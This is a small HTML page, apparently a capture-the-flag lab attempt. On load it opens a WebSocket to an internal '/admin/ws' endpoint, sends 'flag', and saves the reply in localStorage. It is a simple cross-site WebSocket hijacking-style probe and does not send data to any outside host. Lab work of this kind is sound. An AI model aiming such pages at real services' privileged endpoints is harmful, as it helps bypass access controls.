<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket Flag Request</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // WebSocket URL
            const wsUrl = 'ws://hw2-3-web:8080/admin/ws';

            // Open the WebSocket connection
            const ws = new WebSocket(wsUrl);

            // When the WebSocket connection opens, send the flag request
            ws.onopen = () => {
                console.log('WebSocket connection opened');
                ws.send('flag'); // Send the 'flag' message to the WebSocket server
            };

            // When a message is received from the WebSocket, save and log it
            ws.onmessage = (event) => {
                const flag = event.data; // The data received from the WebSocket
                console.log('Received flag:', flag);

                // Save the flag (in this case, just storing it in localStorage for simplicity)
                localStorage.setItem('flag', flag); // Save to localStorage
                alert('Flag received and saved: ' + flag); // Alert the user with the flag
            };

            // Handle WebSocket errors
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };

            // When the WebSocket connection closes
            ws.onclose = () => {
                console.log('WebSocket connection closed');
            };
        });
    </script>
</head>
<body>
    <h1>WebSocket Flag Request</h1>
    <p>The page will open a WebSocket connection to the server, send the message "flag", and save the response.</p>
</body>
</html>
